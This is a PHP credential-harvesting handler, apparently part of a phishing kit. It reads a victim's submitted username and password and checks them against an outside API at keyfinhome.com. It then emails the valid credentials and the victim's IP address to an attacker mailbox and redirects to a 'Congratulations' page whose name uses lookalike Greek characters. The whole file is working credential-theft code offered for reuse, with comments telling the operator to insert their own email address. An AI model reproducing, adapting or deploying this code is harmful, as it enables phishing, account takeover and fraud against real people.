<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ipaddress = getenv("REMOTE_ADDR");
$recipient = "result@insectram.io"; // Replace your email id here
$api = 'http://keyfinhome.com/api/go/index2.php';  //put api url

if (empty($username) || empty($password))
	{
	header("Location: index.php?error=2&cmd=login_submit&email=$username&id=ff915c8ef3d47528435df7a1bed432efff915c8ef3d47528435df7a1bed432ef&session=ff915c8ef3d47528435df7a1bed432efff915c8ef3d47528435df7a1bed432ef");
	}
  else
	{
	$url = "$api?email=$username&password=$password";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$result = curl_exec($ch);
	curl_close($ch);
	if ($result == 1)
		{
		$date = date('d-m-Y');
		$message = "-----------------+ G Verified  +-----------------\n";
		$message.= "User ID: " . $username . "\n";
		$message.= "Password: " . $password . "\n";
		$message.= "Client IP      : $ipaddress\n";
		$message.= "-----------------+ Created in HINT+------------------\n";
		$subject = " $date.GV: " . $ipaddress . "\n";
		$headers.= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
		$headers.= "MIME-Version: 1.0\n";
		$headers.= $_POST['eMailAdd'] . "\n";
		$headers = "From: ||HINT||<kane@kanesangels.com>\n";
		mail($recipient, $subject, $message, $headers);
		header("Location: Congrαtulαtiοns.php");
		}
	  else
		{
		header("Location: index.php?error=1&cmd=login_submit&email=$username&id=ff915c8ef3d47528435df7a1bed432efff915c8ef3d47528435df7a1bed432ef");
		}
	}

?>
